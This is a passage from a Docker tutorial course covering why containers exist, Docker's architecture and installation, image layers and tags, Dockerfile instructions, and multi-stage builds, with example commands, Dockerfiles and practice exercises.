PRs? Are actions/images/templates pinned and updated by automation? Do we know our flaky tests, and does each have an owner? Have we rolled back in the last quarter, on purpose, to practice? Do we track DORA metrics and act on them? Try it Score your project against the review checklist. Pick the two weakest items and write a concrete fix for each. Export the last 50 pipeline runs (via gh run list --json or the GitLab API) and compute success rate and p90 duration. Find a test that failed and then passed on re-run in the last month. Reproduce it by running it 100 times and identify the cause. Practice a rollback in staging: deploy a deliberately bad version, then restore the previous digest using only your pipeline. Time it.

title: Why Containers?
text: Why Containers? Containers exist to solve one stubborn problem: software that behaves differently depending on where it runs. A container packages your application together with everything it needs, then runs it as an isolated process on a shared kernel. It is not magic and it is not a tiny virtual machine, and once you see what it really is, most of Docker stops being mysterious. The problem: "works on my machine" Imagine a Node.js API. On your laptop it runs on Node 22, macOS, with a globally installed libvips , an .env file you forgot to commit, and PostgreSQL 16. The production server runs Ubuntu 22.04, Node 18 installed years ago, no libvips , and a different locale. The code is identical, yet: A native dependency fails to compile because the system library is missing or a different version. A date-formatting bug appears because of a different timezone or ICU version. Two apps on the same server need Python 3.9 and Python 3.12 and fight over the system interpreter. A new teammate spends two days following an outdated "setup" wiki page. Staging passes and production fails, and nobody can say what differs between them. Without containers the usual workarounds are long README setup guides, configuration-management scripts that try to converge a server into a known state, or per-language version managers (nvm, pyenv, rbenv, virtualenv). Each solves one slice. None of them ships the whole environment (OS libraries, runtime, app, config defaults) as one artifact. The container idea Build the environment once, as an immutable image . Run that exact image on your laptop, in CI, in staging and in production. If it works in one place, it works in all of them, because the filesystem the process sees is byte-for-byte the same. Virtual machines vs. containers Before containers, the standard answer to isolation was the virtual machine. A hypervisor (KVM, VMware, Hyper-V, Xen) emulates hardware, and each VM boots a full guest operating system with its own kernel. Virtual machines Containers ┌────────┐ ┌────────┐ ┌────────┐ ┌────────┐ ┌────────┐ ┌────────┐ │ App A │ │ App B │ │ App C │ │ App A │ │ App B │ │ App C │ │ Libs │ │ Libs │ │ Libs │ │ Libs │ │ Libs │ │ Libs │ │Guest OS│ │Guest OS│ │Guest OS│ └───┬────┘ └───┬────┘ └───┬────┘ │(kernel)│ │(kernel)│ │(kernel)│ ┌───┴──────────┴──────────┴────┐ └───┬────┘ └───┬────┘ └───┬────┘ │ Container runtime (Docker) │ ┌───┴──────────┴──────────┴────┐ ├──────────────────────────────┤ │ Hypervisor │ │ Host OS (ONE shared kernel)│ ├──────────────────────────────┤ ├──────────────────────────────┤ │ Host OS / Hardware │ │ Hardware │ └──────────────────────────────┘ └──────────────────────────────┘ Virtual machine Container Isolation boundary Hardware-level (hypervisor) Kernel-level (namespaces, cgroups) Kernel Own kernel per VM Shares the host kernel Typical size Gigabytes Megabytes to a few hundred MB Startup Tens of seconds to minutes Milliseconds to seconds Overhead Memory for a whole OS each Near zero; it is just a process Density Tens per host Hundreds to thousands per host Security isolation Stronger (smaller attack surface) Weaker (kernel bugs affect all) Different OS kernel Yes (Windows VM on Linux host) No, must match host kernel type The trade-off is real: containers give up some isolation strength in exchange for speed and density. This is why multi-tenant clouds that run untrusted code (AWS Lambda, Fargate) wrap containers in micro-VMs such as Firecracker. For your own trusted services, plain containers are the norm. Containers and VMs also combine: most production containers run inside VMs (EC2 instances, GCE nodes). What a container really is There is no "container" object in the Linux kernel. A container is an ordinary Linux process (plus its children) that the kernel has been told to lie to and to limit. Three kernel features do nearly all the work. 1. Namespaces: what a process can see A namespace gives a process its own private view of one kind of system resource. Namespace Isolates Effect inside the container pid Process IDs Your app is PID 1; it cannot see host processes net Network stack Own interfaces, IP, routing table, ports mnt Mount points Own root filesystem ( / ) uts Hostname Own hostname ipc Shared memory, semaphores Private IPC user UID/GID mapping Root inside can map to unprivileged outside cgroup cgroup view Own view of resource hierarchy 2. cgroups: how much a process can use Control groups limit and account for CPU, memory, I/O and process counts. When you run docker run --memory=256m --cpus=0.5 , Docker simply writes those numbers into a cgroup. If the process exceeds the memory limit, the kernel's OOM killer terminates it (you will meet this as exit code 137). 3. Union filesystems: what files it has An image is a stack of read-only filesystem layers. At run time the container runtime merges them with a union/overlay filesystem ( overlay2 on modern Linux) and adds a thin writable layer on top. Many containers can share the same underlying read-only layers, which is why starting a container is nearly instant and storage is cheap. Layers are covered in depth in the images lesson. Seeing it with your own eyes You can build a crude container by hand on any Linux box, with no Docker at all: # Run bash in new PID, mount and UTS namespaces (needs root) sudo unshare --pid --fork --mount-proc --uts bash # Inside the new shell: hostname demo # changes hostname only inside this namespace ps aux # shows only a couple of processes, bash is PID 1 exit Now with Docker, see the same truth from the host side: docker run -d --name web nginx:1.27 docker top web # the processes, as seen from the host ps aux | grep "nginx: master" # the SAME process is visible on the host, with a normal PID docker exec web ps aux # inside the container the master is PID 1 The same process has two PIDs depending on which namespace you ask. That is the whole trick. Docker Desktop on Mac and Windows The Linux kernel features above do not exist on macOS or Windows. Docker Desktop transparently runs a small Linux VM (using Apple Virtualization framework or WSL 2) and runs your containers inside it. So "containers share the host kernel" really means "share the Linux VM's kernel" on those platforms. What you get from containers Reproducibility. The image is immutable. Same bytes, same behavior. Isolation of dependencies. Two apps with conflicting library versions coexist peacefully. Fast onboarding. docker compose up replaces a 30-step setup document. Efficient resource use. Many more workloads per server than with VMs. A universal deployment unit. Kubernetes, ECS, Cloud Run, Fly.io and Nomad all consume the same OCI image format. Easy rollback. Deploying a version means running image tag X; rolling back means running tag X-1. What containers do NOT give you Not a security sandbox by default. A root process in a default container is far more powerful than people assume. See the security lesson. Not persistence. The writable layer disappears with the container. Data needs volumes. Not orchestration. Docker alone does not restart across machines, scale or load balance. That is Kubernetes' job. Not a fix for bad architecture. A tangled app in a container is a tangled app in a container. Not portable across CPU architectures. An arm64 image will not run natively on amd64 ; see multi-arch builds. Common misconception "Containers are lightweight VMs." Thinking this way leads to SSH-ing into containers, running several services in one, and treating them as pets. Treat a container as a single process with a packaged filesystem : disposable, replaceable, one concern each. A quick mental model Image : the recipe-plus-ingredients, a read-only template (like a class). Container : a running (or stopped) instance of an image (like an object). Registry : a server where images are stored and shared (like a package repository). Dockerfile : the text recipe for building an image. Try it Install Docker (next lesson) and run docker run --rm alpine cat /etc/os-release . Compare with your host OS. Why does it say Alpine? Run docker run --rm alpine uname -r and uname -r on your host (on Linux). Are the kernel versions identical? Why? Run docker run -d --name sleeper alpine sleep 600 , then find its PID on the host with docker inspect -f '{{.State.Pid}}' sleeper . On Linux, inspect /proc/<pid>/ns/ to see its namespaces. Run docker run --rm --memory=10m alpine sh -c 'head -c 50m /dev/zero | tail' and observe it get killed. You just met cgroups.

title: Docker Architecture and Installation
text: Docker Architecture and Installation "Docker" is really a stack of cooperating pieces: a CLI, a daemon, a high-level runtime (containerd), a low-level runtime (runc), and open standards that tie them together. Knowing which piece does what makes error messages, alternatives like Podman, and Kubernetes' move away from Docker all make sense. The architecture ┌──────────────┐ REST API over ┌─────────────────────────────┐ │ docker (CLI) │───unix socket─────▶│ dockerd (Docker Engine) │ │ docker compose│ /var/run/docker.sock│ images, networks, volumes, │ └──────────────┘ │ build (BuildKit), API │ └──────────────┬──────────────┘ │ gRPC ┌──────────────▼──────────────┐ │ containerd │ │ image pull/store, lifecycle │ └──────────────┬──────────────┘ │ spawns per container ┌──────────────▼──────────────┐ │ containerd-shim + runc │ │ sets up namespaces/cgroups, │ │ then exec()s your process │ └──────────────┬──────────────┘ ▼ Your app (PID 1) Component Role docker CLI Thin client. Turns commands into REST calls. Contains no container logic. dockerd The daemon. Manages images, networks, volumes, the build system and the API. Runs as root. containerd Industry-standard runtime manager (a CNCF graduated project). Pulls images, manages snapshots and container lifecycle. Kubernetes can talk to it directly. containerd-shim A small per-container process that keeps the container alive and holds its stdio even if containerd or dockerd restarts. runc The low-level runtime. Creates namespaces and cgroups, mounts the filesystem, then exec s your process and exits. The socket is root The CLI talks to the daemon through /var/run/docker.sock . Anyone who can write to that socket can start a privileged container that mounts the host's / , which is effectively root on the host. Adding a user to the docker group is therefore equivalent to giving them passwordless root. Never mount the socket into a container unless you truly understand why. The OCI standards The Open Container Initiative defines vendor-neutral specifications so the ecosystem is not locked to Docker: Image spec : the format of an image (manifest, config, layer tarballs). Runtime spec : how to run an unpacked filesystem bundle ( runc implements it). Distribution spec : the HTTP API registries speak for push and pull. Because of these, an image built with Docker runs on Podman, containerd, CRI-O, Kubernetes, AWS ECS and Cloud Run without changes. Installing Docker Mac and Windows: Docker Desktop (or alternatives) Docker Desktop bundles the engine, CLI, Compose, BuildKit and a Linux VM with a GUI. Download it from docker.com. Note the licensing: it is free for personal use, education and small businesses, but larger companies need a paid subscription. Free alternatives include Colima ( brew install colima docker , then colima start ), Rancher Desktop and OrbStack. Linux: Docker Engine On Ubuntu or Debian, use Docker's official apt repository rather than the distribution's often outdated docker.io package. Follow the current steps at docs.docker.com/engine/install, which boil down to: # Convenience script (fine for dev machines, review before running) curl -fsSL https://get.docker.com -o get-docker.sh less get-docker.sh sudo sh get-docker.sh # Run docker without sudo (log out and back in afterwards) sudo usermod -aG docker $USER # Start at boot sudo systemctl enable --now docker For production servers prefer the explicit apt repository setup so versions are pinned and auditable. Verify docker version # client AND server sections; if server is missing the daemon is down docker info # storage driver (overlay2), cgroup version, runtimes docker run --rm hello-world hello-world exercises the full chain: CLI to daemon, daemon pulls the image from Docker Hub, containerd and runc run it, output streams back. The core commands Run docker run nginx:1.27 # foreground; Ctrl+C stops it docker run -d --name web -p 8080:80 nginx:1.27 # detached, named, publish port docker run -it --rm ubuntu:24.04 bash # interactive shell, auto-remove on exit docker run -e APP_ENV=dev -v "$PWD":/app alpine ls /app Flag Meaning -d Detached: run in background and print the container ID -it -i keep stdin open, -t allocate a terminal. Needed for interactive shells --name Human name instead of a random one such as quirky_turing -p host:container Publish a port (see networking lesson) -e KEY=val Set environment variable -v Mount a volume or bind mount --rm Delete the container when it exits; use for throwaway runs --restart unless-stopped Restart policy after crashes or daemon restarts Inspect and manage docker ps # running containers docker ps -a # include stopped ones docker logs web # stdout/stderr of the main process docker logs -f --tail 100 web # follow, last 100 lines docker exec -it web sh # open a shell in a running container docker exec web nginx -t # run a one-off command docker stop web # SIGTERM, then SIGKILL after 10s docker start web # restart a stopped container (same filesystem state) docker restart web docker rm web # delete a stopped container (-f to force a running one) docker images # local images docker rmi nginx:1.27 # delete an image docker pull postgres:16 # download without running docker system df # disk usage docker system prune # remove stopped containers, dangling images, unused networks stop vs. kill docker stop sends SIGTERM and waits (default 10 seconds) so your app can shut down gracefully, then sends SIGKILL. If your container always takes exactly 10 seconds to stop, your process is ignoring SIGTERM, a classic sign that it is not PID 1-aware or that the shell form of CMD swallowed the signal. We fix that in the Dockerfile lesson. The lifecycle image ──create──▶ Created ──start──▶ Running ──stop/exit──▶ Exited ──rm──▶ (gone) │ ▲ │ │ └─────start────────┘ └─pause/unpause─▶ Paused Stopping does not delete. A stopped container keeps its writable layer until docker rm , which is why docker ps -a accumulates clutter if you forget --rm . A first real example docker run -d --name web -p 8080:80 nginx:1.27 curl -i http://localhost:8080 # nginx welcome page docker exec web cat /etc/nginx/nginx.conf | head docker logs web # see your curl request logged docker stop web && docker rm web Alternatives to Docker Tool What it is Notes Podman Daemonless, rootless-by-default engine from Red Hat. Docker-compatible CLI. alias docker=podman works for most commands. Each container is a child of your shell, not a daemon. Supports pods and podman compose . Popular on RHEL/Fedora. containerd + nerdctl containerd's own Docker-like CLI Used in Kubernetes nodes; nerdctl gives a familiar UX. CRI-O Minimal runtime built only for Kubernetes Default in OpenShift. Buildah / Kaniko / BuildKit Image builders Build images without a privileged daemon, useful in CI. Colima, OrbStack, Rancher Desktop Docker Desktop replacements on Mac Provide the Linux VM and a Docker-compatible socket. Kubernetes and Docker Kubernetes removed its built-in "dockershim" in v1.24. Clusters now talk to containerd or CRI-O directly. Your Docker-built images still run perfectly, because they are OCI images. Only the node-level runtime changed. Pitfalls "Cannot connect to the Docker daemon" : daemon not running, or your user lacks socket permission. Disk full : images and stopped containers pile up. Schedule docker system prune (with care; -a also deletes unused images). Using latest : unpredictable. Pin versions like nginx:1.27 . Apple Silicon surprises : pulling amd64 -only images runs under slow emulation. Use --platform linux/amd64 deliberately. Try it Install Docker and run docker run --rm hello-world . Read the explanatory output line by line. Start nginx as shown above on port 8080, curl it, view logs, then stop and remove it. Run docker run -d --name t alpine sleep 300 then time docker stop t . Why did it take about 10 seconds? Repeat with docker kill t . Run docker info | grep -i -E 'storage|cgroup|runtime' and identify the pieces from the diagram.

title: Images and Layers
text: Images and Layers An image is not one big file. It is an ordered stack of immutable, content-addressed layers plus a small piece of JSON metadata. Understanding layers explains why builds are sometimes instant and sometimes slow, why pulls reuse downloads, why deleting a file in a later step does not shrink your image, and why tags are not the same as versions. What is inside an image An OCI image consists of three things: Layers : compressed tar archives, each holding the filesystem changes from one build step (files added, modified or deleted). Config : JSON with the default command, environment variables, exposed ports, working directory, user, architecture and the ordered list of layer hashes. Manifest : JSON that lists the config and layers by digest. A registry stores and serves these. Image myapp:1.4 ┌────────────────────────────────────────┐ │ Layer 5 COPY . . (app code)│ ← changes most often ├────────────────────────────────────────┤ │ Layer 4 RUN npm ci (node_mod)│ ├────────────────────────────────────────┤ │ Layer 3 COPY package*.json │ ├────────────────────────────────────────┤ │ Layer 2 node:22-slim runtime layers │ ├────────────────────────────────────────┤ │ Layer 1 Debian base filesystem │ ← changes least often └────────────────────────────────────────┘ all READ-ONLY, shared by many images ┌────────────────────────────────────────┐ │ Container writable layer (copy-on-write)│ ← per running container └────────────────────────────────────────┘ Content-addressable storage Every layer, config and manifest is named by the SHA-256 hash of its content, written sha256:ab12... . This one design choice gives you a lot: Deduplication. If ten images share the same Debian base layer, it is stored once on disk and downloaded once. Integrity. A pulled layer is verified against its hash. Tampering or corruption is detected. Immutability. You cannot change a layer; changing content changes the hash, making it a different layer. Cheap pushes. The registry says "I already have that digest" and the push skips it. docker pull python:3.13-slim # 3.13-slim: Pulling from library/python # a2318d6c47ec: Pull complete # ... docker pull python:3.12-slim # shared layers say "Already exists" Copy-on-write at runtime When a container starts, the runtime stacks the read-only layers with an overlay filesystem and adds an empty writable layer. If the container modifies a file from a lower layer, the file is first copied up into the writable layer and changed there. Lower layers are never touched. Deleting a file adds a "whiteout" marker in the upper layer that hides it. Deleting in a later layer does not shrink the image If layer 3 downloads a 500 MB archive and layer 4 runs rm on it, the image still contains the 500 MB in layer 3. The deletion is only a whiteout on top. Combine download, use and cleanup in the same RUN instruction, or use multi-stage builds. This also means a secret you COPY and then delete is still extractable from the image. Tags vs. digests A full image reference looks like this: registry.example.com / team / myapp : 1.4.2 @ sha256:9f86d0… └──── registry ────┘ └repo┘ └name┘ └tag┘ └────digest────┘ Tag Digest What it is A human-friendly, mutable pointer The hash of the manifest, immutable Example nginx:1.27 nginx@sha256:… Can change meaning? Yes: the publisher can re-push 1.27 with a security patch, or latest with anything Never Use for Readability, development Reproducible, auditable production deploys If you omit a tag, Docker assumes :latest . That is not "the newest", it is merely the default tag name, and publishers may not even maintain it. Always specify tags explicitly. docker images --digests nginx docker inspect --format '{{index .RepoDigests 0}}' nginx:1.27 # In a Dockerfile, pin tag AND digest (tag is for humans, digest is enforced) FROM nginx:1.27@sha256:<digest-here> Multi-architecture images have a top-level "index" (manifest list) whose digest points to per-platform manifests. Pulling by tag on an ARM Mac and an x86 server resolves to different manifests under the same tag. Inspecting layers docker history myapp:1.4 # IMAGE CREATED CREATED BY SIZE # 3f1c... 2 minutes ago CMD ["node" "server.js"] 0B # 8a2b... 2 minutes ago COPY . . # buildkit 1.2MB # c7d9... 3 minutes ago RUN npm ci --omit=dev 85MB # e01a... 3 minutes ago COPY package*.json ./ 4kB # ... 2 weeks ago /bin/sh -c #(nop) CMD ["node"] 0B docker history --no-trunc --format '{{.Size}}\t{{.CreatedBy}}' myapp:1.4 docker image inspect myapp:1.4 | less # full config, layer digests, env docker save myapp:1.4 | tar -tv | head # raw layer tarballs docker system df -v # image sizes and shared sizes For a more visual exploration use the open-source tool dive , which shows each layer's file changes and flags wasted space. The build cache When you run docker build , each Dockerfile instruction produces a layer. Docker reuses a cached layer if: The instruction text is identical, and The parent layer is the same cached layer, and For COPY / ADD , the content checksums of the copied files are unchanged. Crucially, the moment one layer is invalidated, every layer after it is rebuilt . That makes instruction order the single biggest build-speed lever: # SLOW: any source edit invalidates npm install COPY . . RUN npm ci # FAST: dependencies reinstall only when package files change COPY package.json package-lock.json ./ RUN npm ci COPY . . RUN instructions are cached by their text, not their effect. RUN apt-get update can stay cached for months and then install stale package lists. That is why you chain apt-get update && apt-get install in one RUN , and why CI builds sometimes use --no-cache or --pull on a schedule to pick up security patches. Image size matters Why it matters Effect Pull time Slow deploys and slow autoscaling when a node must download 1.2 GB Registry and bandwidth cost Egress and storage are billed Attack surface Every extra package is a potential CVE (compilers, shells, curl) Cache churn Fat layers rebuild and re-upload slowly Rough sizes of common base images: Base Approx. size ubuntu:24.04 ~80 MB node:22 (full Debian) ~1.1 GB node:22-slim ~220 MB node:22-alpine ~160 MB python:3.13-slim ~125 MB alpine:3.20 ~8 MB gcr.io/distroless/static ~2 MB scratch 0 (empty) Techniques to shrink images (full treatment in the multi-stage lesson): pick a slim base, multi-stage builds, clean package caches in the same layer, install only production dependencies, and use .dockerignore . Working with images docker tag myapp:1.4 myapp:latest # add another tag to the same image ID docker tag myapp:1.4 ghcr.io/acme/myapp:1.4 docker rmi myapp:latest # removes the tag; layers stay while another tag uses them docker image prune # remove dangling (untagged) images docker image prune -a --filter "until=168h" # unused images older than a week docker save -o myapp.tar myapp:1.4 # export to a file (air-gapped transfer) docker load -i myapp.tar "Dangling" images are untagged leftovers, often the previous build of a tag you just rebuilt. Mental model Think of an image like a Git repository: layers are commits (immutable, hashed, shared), tags are branches (movable pointers), and the digest is the commit SHA. Production should deploy SHAs; humans read branches. Try it Pull node:22 , node:22-slim and node:22-alpine . Compare with docker images node . Run docker history node:22-alpine . Which layer is biggest? Build two tiny Dockerfiles: one with RUN dd if=/dev/zero of=big bs=1M count=100 followed by RUN rm big , one with both in a single RUN . Compare sizes and explain the difference. Run docker inspect --format '{{index .RepoDigests 0}}' alpine:3.20 and then pull by that digest.

title: Writing Dockerfiles
text: Writing Dockerfiles A Dockerfile is a text recipe: start from a base image, then run a series of instructions, each producing a layer. Writing a good one is mostly about knowing what each instruction really does, ordering them for the build cache, and keeping the result small, secure and well-behaved at shutdown. Anatomy of a Dockerfile # syntax=docker/dockerfile:1 # base image (required, first) FROM node:22-slim # set and create working directory WORKDIR /app # copy files from build context COPY package*.json ./ # execute a command at BUILD time RUN npm ci --omit=dev COPY . . # environment variable (build + runtime) ENV NODE_ENV=production # documentation only EXPOSE 3000 # drop root USER node # default command at RUN time CMD ["node", "server.js"] Build and run it: docker build -t myapp:1.0 . # "." is the build context docker run -d -p 3000:3000 myapp:1.0 Every instruction explained Instruction What it does Notes FROM Sets the base image. FROM scratch is empty. Multiple FROM s create stages. Pin the version. FROM node:22-slim AS build names a stage. WORKDIR Sets the working directory for later instructions and the runtime. Creates it if missing. Prefer over RUN cd , which does not persist. COPY Copies files from the build context (or another stage) into the image. COPY --chown=node:node . . , COPY --from=build /out /app . ADD Like COPY, plus auto-extracts local tarballs and can fetch URLs. Prefer COPY ; use ADD only for tar auto-extraction. RUN Executes a command during build and commits the result as a layer. Shell form runs via /bin/sh -c ; exec form RUN ["a","b"] does not. ENV Sets environment variables, persisted into the image and visible to running containers. Never put secrets here; they show in docker inspect . ARG Build-time variable passed with --build-arg . Not present at runtime. Also visible in docker history ; not for secrets. EXPOSE Documents which port the app listens on. Does NOT publish the port. You still need -p . USER Sets the user for following instructions and the runtime process. Create a non-root user; see security lesson. VOLUME Declares a mount point that gets an anonymous volume. Mostly avoid; define volumes at run time/Compose. ENTRYPOINT The executable that always runs. See next section. CMD Default arguments (or default command) overridable at docker run . One effective CMD; last wins. HEALTHCHECK Command Docker runs periodically to judge health. HEALTHCHECK CMD curl -fs http://localhost:3000/health || exit 1 LABEL Key/value metadata. OCI keys such as org.opencontainers.image.source . SHELL Changes the default shell for shell-form commands. E.g. SHELL ["/bin/bash","-o","pipefail","-c"] . STOPSIGNAL Signal sent by docker stop . Default SIGTERM. ENTRYPOINT vs. CMD Both define what runs when the container starts. The distinction is who can override what. ENTRYPOINT : the program. Overridden only with --entrypoint . CMD : default arguments to the entrypoint (or the whole command if there is no entrypoint). Replaced by anything you put after the image name in docker run . Dockerfile docker run img docker run img --foo CMD ["node","server.js"] node server.js runs --foo as the command (error!) ENTRYPOINT ["node"] node node --foo ENTRYPOINT ["node"] CMD ["server.js"] node server.js node --foo A common pattern is an entrypoint script that prepares the environment, then hands over to the real process: #!/bin/sh # docker-entrypoint.sh set -e echo "Running migrations..." node migrate.js exec "$@" # replace the shell with the CMD so signals reach the app COPY docker-entrypoint.sh /usr/local/bin/ ENTRYPOINT ["docker-entrypoint.sh"] CMD ["node", "server.js"] Exec form vs. shell form CMD ["node", "server.js"] # exec form (JSON array): node IS PID 1 CMD node server.js # shell form: /bin/sh -c "node server.js", sh is PID 1 Always use exec form for CMD and ENTRYPOINT In shell form, sh is PID 1 and does not forward SIGTERM to your app. docker stop then waits 10 seconds and kills it forcibly, losing graceful shutdown (open requests dropped, DB connections not closed). Exec form makes your app PID 1 so it receives signals. Also note PID 1 has special signal semantics: handle SIGTERM explicitly in your code, or run with docker run --init (adds a tiny init, tini) to reap zombies and forward signals. Build context and .dockerignore The . in docker build . is the build context : the directory whose contents are sent to the builder. COPY can only see files inside it. Sending a context that includes node_modules , .git and build output is slow and pollutes the cache (any change in those files invalidates COPY . . ). It can also leak secrets such as .env into the image. # .dockerignore .git node_modules npm-debug.log dist coverage .env .env.* *.md Dockerfile docker-compose*.yaml .DS_Store __pycache__ *.pyc .venv Layer-friendly RUN # Bad: three layers, cache goes stale, apt lists left behind RUN apt-get update RUN apt-get install -y curl RUN rm -rf /var/lib/apt/lists/* # Good: one layer, no leftovers, no recommended extras RUN apt-get update \ && apt-get install -y --no-install-recommends curl ca-certificates \ && rm -rf /var/lib/apt/lists/* Full example: Node.js # syntax=docker/dockerfile:1 FROM node:22-slim ENV NODE_ENV=production WORKDIR /app # 1. dependency manifests first -> cached until they change COPY package.json package-lock.json ./ RUN npm ci --omit=dev # 2. application code COPY --chown=node:node . . # built-in unprivileged user in node images USER node EXPOSE 3000 HEALTHCHECK --interval=30s --timeout=3s --start-period=10s \ CMD node -e "fetch('http://localhost:3000/health').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))" CMD ["node", "server.js"] npm ci installs exactly what the lockfile says (reproducible, faster than npm install ). The healthcheck uses Node itself because slim images have no curl. Full example: Python (FastAPI) # syntax=docker/dockerfile:1 FROM python:3.13-slim ENV PYTHONDONTWRITEBYTECODE=1 \ PYTHONUNBUFFERED=1 \ PIP_NO_CACHE_DIR=1 WORKDIR /app # Create unprivileged user RUN useradd --create-home --uid 10001 appuser COPY requirements.txt . RUN pip install -r requirements.txt COPY --chown=appuser:appuser . . USER appuser EXPOSE 8000 CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"] PYTHONUNBUFFERED=1 makes logs appear immediately in docker logs instead of being buffered. Binding to 0.0.0.0 is essential: 127.0.0.1 inside a container is reachable only from inside that container, so published ports would not work. Full example: Go (static binary) # syntax=docker/dockerfile:1 FROM golang:1.24 AS build WORKDIR /src COPY go.mod go.sum ./ RUN go mod download COPY . . RUN CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /out/server ./cmd/server FROM gcr.io/distroless/static-debian12:nonroot COPY --from=build /out/server /server EXPOSE 8080 ENTRYPOINT ["/server"] Go compiles to a single static binary, so the final image can be ~10 MB with no shell or package manager. The multi-stage pattern is explained in the next lesson. Configuration: ENV vs. ARG vs. runtime # build-time only ARG APP_VERSION=dev # promote to runtime if needed ENV APP_VERSION=$APP_VERSION # docker build --build-arg APP_VERSION=1.4.2 -t myapp:1.4.2 . Environment-specific values (database URLs, API keys) belong at run time ( -e , --env-file , Compose, orchestrator secrets), not in the image. The image should be identical in every environment; only configuration varies. This is the build-once, deploy-anywhere principle. Pitfalls Running as root because nobody added USER . COPY . . before installing dependencies , destroying the cache. Secrets via ARG/ENV/COPY . They persist in layers and metadata. Use BuildKit secret mounts (next lesson). Using latest base images , so builds change without you touching anything. Multiple processes in one container (app + cron + ssh). Split them. Forgetting .dockerignore . Apps that log to files instead of stdout/stderr, so docker logs shows nothing. apt-get upgrade in Dockerfiles : non-reproducible. Bump the base image instead. Linting Run hadolint Dockerfile locally or in CI. It flags unpinned versions, missing --no-install-recommends , shell-form CMD and dozens of other issues. Recent Docker also has docker build --check for built-in lint rules. Try it Create a minimal Express or FastAPI "hello" app and write the Dockerfile above. Build and run it, then hit it with curl. Change one line of source and rebuild. Which steps say CACHED ? Now change package.json and rebuild; what is different? Switch CMD to shell form and time docker stop . Switch back and compare. Add .dockerignore and compare the "transferring context" size in the build output before and after. Override the command: docker run --rm myapp:1.0 node -v . Then use --entrypoint sh to get a shell.

title: Multi-Stage Builds and Optimization
text: Multi-Stage Builds and Optimization Compilers, dev dependencies and build tools are needed to build your app but are dead weight (and attack surface) when you run it. Multi-stage builds let one Dockerfile use a fat image to build and a tiny image to ship. Combine that with smart cache ordering, BuildKit features and multi-arch builds, and you get fast builds and small, safe images. The problem A single-stage Go or Node build leaves behind everything it used: the 800 MB Go toolchain, gcc , node_modules/.cache , TypeScript sources, test files. Before multi-stage, teams maintained two Dockerfiles plus a shell script to copy artifacts between them. Now it is built in. How multi-stage works Each FROM starts a new stage with a fresh filesystem. COPY --from=<stage> pulls specific files from an earlier stage. Only the last stage becomes the final image (unless you pick another with --target ); earlier stages are discarded. Stage "deps" Stage "build" Stage "runtime" (final) ┌────────────────┐ ┌───────────────────┐ ┌─────────────────────┐ │ node:22 │ │ FROM deps │ │ node:22-slim │ │ npm ci (all) │───▶│ COPY src │──┐ │ COPY --from=build │ └────────────────┘ │ npm run build │ └─▶│ /app/dist │ └───────────────────┘ │ COPY prod node_mods │ discarded discarded └─────────────────────┘ ← this is what ships Node.js with TypeScript # syntax=docker/dockerfile:1 FROM node:22-slim AS deps WORKDIR /app COPY package.json package-lock.json ./ RUN --mount=type=cache,target=/root/.npm npm ci FROM deps AS build COPY . . RUN npm run build # tsc -> /app/dist FROM node:22-slim AS prod-deps WORKDIR /app COPY package.json package-lock.json ./ RUN --mount=type=cache,target=/root/.npm npm ci --omit=dev FROM node:22-slim AS runtime ENV NODE_ENV=production WORKDIR /app COPY --from=prod-deps /app/node_modules ./node_modules COPY --from=build /app/dist ./dist COPY package.json ./ USER node CMD ["node", "dist/server.js"] Useful targets Add a test or dev stage and select it with --target : FROM build AS test RUN npm test # docker build --target test . # run tests in CI, never ships # docker build --target runtime -t myapp . Choosing a base image Base Pros Cons Full ( node:22 , python:3.13 ) Has compilers and tools; easy debugging Large (~1 GB), many CVEs Slim ( -slim , Debian) glibc, small, broad compatibility; default sensible choice No build tools; needs apt for native deps Alpine ( -alpine ) Tiny (musl libc, BusyBox), quick pulls musl differences cause subtle bugs: Python wheels often must compile from source (slow), DNS and performance quirks, some native Node modules fail Distroless ( gcr.io/distroless/* ) No shell, no package manager; minimal attack surface; :nonroot tags Cannot docker exec ... sh ; debugging needs :debug variants or ephemeral containers scratch Literally empty; ideal for static Go/Rust binaries No CA certs, timezone data or users unless you copy them in Chainguard / hardened images Minimal, frequently patched, SBOMs included Some tiers paid; different conventions Rule of thumb Start with -slim . Move to distroless or scratch for compiled languages when you want minimal size and attack surface. Use Alpine when you understand the musl trade-offs. Smaller is not automatically better: an image that breaks in production is more expensive than 100 MB. Layer cache ordering Order instructions from least to most frequently changing. Dependencies change weekly, source changes every commit: # Python COPY requirements.txt . RUN pip install -r requirements.txt # cached until requirements change COPY . . # busts only layers after it Apply the same logic to system packages (top), language dependencies (middle), source (bottom), build step (end). Copy only what each step needs, e.g. COPY go.mod go.sum ./ before go mod download . BuildKit BuildKit is the modern build engine and the default since Docker 23. It builds independent stages in parallel, skips stages the target does not need, and offers powerful mounts. Enable features with the first line # syntax=docker/dockerfile:1 . Use docker buildx build for the extended CLI. Cache mounts Layer caching is all-or-nothing: if package.json changes, npm ci re-downloads everything. A cache mount persists a directory across builds without becoming part of the image: RUN --mount=type=cache,target=/root/.cache/pip pip install -r requirements.txt RUN --mount=type=cache,target=/go/pkg/mod --mount=type=cache,target=/root/.cache/go-build \ go build -o /out/server ./cmd/server RUN --mount=type=cache,target=/var/cache/apt --mount=type=cache,target=/var/lib/apt \ apt-get update && apt-get install -y --no-install-recommends libpq5 Secret mounts Need a private npm token at build time? Never use ARG or COPY . Mount it as a file that exists only during that one RUN and is never written to a layer: RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci # docker build --secret id=npmrc,src=$HOME/.npmrc -t myapp . Similarly --mount=type=ssh forwards your SSH agent for private git dependencies. Bind mounts and heredocs RUN --mount=type=bind,source=requirements.txt,target=requirements.txt \ pip install -r requirements.txt # no COPY layer needed RUN <<EOF set -e apt-get update apt-get install -y --no-install-recommends curl rm -rf /var/lib/apt/lists/* EOF CI cache export CI runners start empty, so the cache is lost each run. Export it: docker buildx build \ --cache-from type=registry,ref=ghcr.io/acme/myapp:buildcache \ --cache-to type=registry,ref=ghcr.io/acme/myapp:buildcache,mode=max \ -t ghcr.io/acme/myapp:1.4.2 --push . # On GitHub Actions: --cache-from type=gha --cache-to type=gha,mode=max Multi-architecture images Apple Silicon laptops and AWS Graviton servers are arm64 ; most older servers are amd64 .
